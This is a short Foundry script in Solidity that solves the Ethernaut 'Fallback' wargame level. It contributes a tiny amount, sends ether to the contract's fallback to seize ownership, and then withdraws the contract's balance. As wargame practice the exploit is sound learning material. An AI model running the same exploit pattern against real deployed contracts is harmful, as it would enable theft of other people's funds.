pragma solidity ^0.8.0;

import "../../src/Ethernaut/fallback.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackScript is Script {
    Fallback public instance =
        Fallback(payable(0x3847582118a8DFAbc70BB25e32299704E10582f1));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        instance.contribute{value: 1 wei}();
        payable(address(instance)).call{value: 1 wei}("");
        instance.withdraw();
        vm.stopBroadcast();
    }
}
